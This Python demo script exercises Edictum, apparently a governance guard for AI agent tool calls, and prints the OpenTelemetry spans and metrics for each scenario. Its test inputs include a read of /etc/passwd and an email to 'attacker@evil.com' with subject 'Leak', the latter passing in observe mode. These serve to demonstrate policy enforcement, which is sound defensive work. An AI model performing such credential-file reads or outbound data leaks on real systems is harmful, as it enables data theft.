#!/usr/bin/env python3
"""Edictum OpenTelemetry Demo — shows governance spans and metrics.

Runs governance scenarios and displays the OTel telemetry (spans + metrics)
that edictum emits for each tool call.

Two OTel modes:
  - Console (default): spans/metrics printed to stdout
  - OTLP: when OTEL_EXPORTER_OTLP_ENDPOINT is set, or EDICTUM_OTEL_CONSOLE=1 for console

Usage:
  python observability/demo_otel.py              # console exporter
  EDICTUM_OTEL_CONSOLE=1 python observability/demo_otel.py  # explicit console
  OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318 python observability/demo_otel.py
"""

import asyncio
import os
import sys
from pathlib import Path

# Ensure adapters/ and observability/ are importable
sys.path.insert(0, str(Path(__file__).parent.parent / "adapters"))
sys.path.insert(0, str(Path(__file__).parent))

# Load .env BEFORE checking OTel env vars
from dotenv import load_dotenv
load_dotenv(Path(__file__).parent.parent / ".env")


def setup_otel() -> str:
    """Configure OTel providers. Must be called BEFORE importing edictum.

    Returns the mode string: 'otlp', 'console', or 'disabled'.
    """
    endpoint = os.environ.get("OTEL_EXPORTER_OTLP_ENDPOINT")

    if endpoint:
        # Use the full OTLP config (supports Grafana Cloud, local collectors)
        from otel_config import configure_otel
        return configure_otel()

    # Default: console exporter for the demo
    try:
        from opentelemetry import metrics, trace
        from opentelemetry.sdk.metrics import MeterProvider
        from opentelemetry.sdk.metrics.export import (
            ConsoleMetricExporter,
            PeriodicExportingMetricReader,
        )
        from opentelemetry.sdk.resources import Resource
        from opentelemetry.sdk.trace import TracerProvider
        from opentelemetry.sdk.trace.export import (
            ConsoleSpanExporter,
            SimpleSpanProcessor,
        )
    except ImportError:
        print("OTel packages not installed. Run: pip install opentelemetry-sdk")
        return "disabled"

    resource = Resource.create({"service.name": "edictum-demo"})

    # Traces
    tp = TracerProvider(resource=resource)
    tp.add_span_processor(SimpleSpanProcessor(ConsoleSpanExporter()))
    trace.set_tracer_provider(tp)

    # Metrics — short interval so counters flush during the demo
    reader = PeriodicExportingMetricReader(
        ConsoleMetricExporter(), export_interval_millis=5000
    )
    mp = MeterProvider(resource=resource, metric_readers=[reader])
    metrics.set_meter_provider(mp)

    return "console"


def banner(mode: str):
    print("=" * 65)
    print("  EDICTUM OPENTELEMETRY DEMO")
    print("=" * 65)
    print(f"  OTel mode:  {mode}")
    print(f"  Tracers:    edictum (GovernanceTelemetry), edictum.governance (engine)")
    print(f"  Metrics:    edictum.calls.allowed, edictum.calls.denied")
    print()
    print("  Spans and metrics will appear between / after scenarios.")
    print("=" * 65)
    print()


def section(num: int, title: str):
    print(f"\n{'─' * 65}")
    print(f"  Scenario {num}: {title}")
    print(f"{'─' * 65}")


async def main():
    # 1. Configure OTel BEFORE any edictum import
    mode = setup_otel()
    banner(mode)

    if mode == "disabled":
        print("No OTel exporters configured. Set OTEL_EXPORTER_OTLP_ENDPOINT or run as-is for console mode.")
        return

    # 2. Now import edictum (GovernanceTelemetry grabs tracer/meter at init)
    from shared_v2 import (
        CollectingAuditSink,
        RULES_PATH,
        make_principal,
        get_weather,
        read_file,
        send_email,
        delete_record,
    )
    from edictum import Edictum, EdictumDenied

    # 3. Create guard in enforce mode
    sink = CollectingAuditSink()
    guard = Edictum.from_yaml(str(RULES_PATH), audit_sink=sink)
    principal = make_principal("analyst")

    # ── Scenario 1: Allow (weather lookup) ────────────────────────
    section(1, "Allow — weather lookup")
    result = await guard.run(
        "get_weather", {"city": "Tokyo"}, get_weather, principal=principal,
    )
    print(f"  Result: {result}")

    # ── Scenario 2: Deny (sandbox violation) ──────────────────────
    section(2, "Deny — sandbox violation (read /etc/passwd)")
    try:
        result = await guard.run(
            "read_file", {"path": "/etc/passwd"}, read_file, principal=principal,
        )
        print(f"  Result: {result}")
    except EdictumDenied as e:
        print(f"  DENIED: {e}")

    # ── Scenario 3: Deny (RBAC — delete without admin) ───────────
    section(3, "Deny — RBAC (delete_record requires admin)")
    try:
        result = await guard.run(
            "delete_record", {"record_id": "REC-001"}, delete_record, principal=principal,
        )
        print(f"  Result: {result}")
    except EdictumDenied as e:
        print(f"  DENIED: {e}")

    # ── Scenario 4: Redact (postcondition PII) ───────────────────
    section(4, "Redact — PII in contacts output")
    result = await guard.run(
        "read_file", {"path": "/home/user/contacts.json"}, read_file, principal=principal,
    )
    print(f"  Result (redacted): {result[:120]}...")

    # ── Scenario 5: Observe mode (email to evil domain) ──────────
    section(5, "Observe — email to evil domain (observe-mode guard)")
    observe_sink = CollectingAuditSink()
    observe_guard = Edictum.from_yaml(
        str(RULES_PATH), mode="observe", audit_sink=observe_sink,
    )
    result = await observe_guard.run(
        "send_email",
        {"to": "attacker@evil.com", "subject": "Leak", "body": "data"},
        send_email,
        principal=principal,
    )
    print(f"  Result (observe — NOT blocked): {result}")

    # ── Scenario 6: Rate limit denial ────────────────────────────
    section(6, "Rate limit — 6th weather call denied (limit: 5)")
    # We already used 1 weather call in scenario 1. Need 4 more to hit the limit.
    cities = ["London", "Berlin", "Sydney", "NYC"]
    for city in cities:
        await guard.run(
            "get_weather", {"city": city}, get_weather, principal=principal,
        )
    print(f"  Calls 2-5 succeeded (London, Berlin, Sydney, NYC)")
    # 6th call should be denied
    try:
        result = await guard.run(
            "get_weather", {"city": "LA"}, get_weather, principal=principal,
        )
        print(f"  Result: {result}")
    except EdictumDenied as e:
        print(f"  DENIED (rate limit): {e}")

    # ── Flush OTel ────────────────────────────────────────────────
    print(f"\n{'=' * 65}")
    print("  Flushing OTel providers...")
    print(f"{'=' * 65}\n")

    from otel_config import shutdown_otel
    # Give the periodic metric reader time to export
    await asyncio.sleep(2)
    shutdown_otel()

    print("\nDone. All spans and metrics have been exported.")


if __name__ == "__main__":
    asyncio.run(main())
